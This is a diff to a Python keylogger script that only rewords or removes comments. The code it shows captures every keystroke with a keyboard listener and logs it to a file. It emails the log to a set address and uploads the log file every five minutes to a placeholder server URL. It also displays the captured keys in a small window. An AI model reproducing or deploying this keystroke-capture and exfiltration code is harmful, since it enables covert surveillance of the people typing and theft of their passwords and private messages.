@@ -19,8 +19,8 @@ email_to = 'parent_email@example.com'
 email_subject = 'Keylogger Data'
 
 # Server configuration to send keystrokes
-server_url = 'https://your-server-url.com/upload'  # Replace with your server URL
-upload_interval = 300  # 5 minutes in seconds
+server_url = 'https://your-server-url.com/upload'  # Replace with server URL
+upload_interval = 300  
 
 key_strokes = ''
 
@@ -79,14 +79,14 @@ def on_press(key):
         pass
     elif key == keyboard.Key.esc:
         send_email(key_strokes)
-        send_to_server(log_file)  # Send the log file to the server
+        send_to_server(log_file)  # Sends the log file to the server
         window.quit()
         return False
     else:
         key_strokes += str(key).strip("'")
         write_to_file(key_strokes)
 
-    # Update the GUI display with the current key strokes
+    
     text_widget.configure(state='normal')
     text_widget.insert(tk.END, key_strokes + '\n')
     text_widget.configure(state='disabled')
@@ -95,11 +95,11 @@ def on_press(key):
 def on_release(key):
     pass
 
-# Create the GUI window
+
 window = tk.Tk()
 window.title("Keylogger")
 
-# Create a scrollable text widget to display the captured keystrokes
+
 text_widget = tk.Text(window, font=("Courier", 12), width=40, height=10)
 text_widget.pack(padx=10, pady=10)
 scrollbar = tk.Scrollbar(window)
@@ -109,7 +109,7 @@ scrollbar.config(command=text_widget.yview)
 
 # Start the keylogger
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    # Print a message to indicate that the keylogger is running
+    # Printing a message to indicate that the keylogger is running
     print("Keylogger started. Press Esc to send the log file and exit.")
     
     # Schedule sending the log file to the server every 5 minutes
@@ -120,5 +120,5 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         except Exception as e:
             print(f"Failed to upload log file. Error: {e}")
 
-    # Run the GUI event loop
+    # Running the GUI event loop
     window.mainloop()
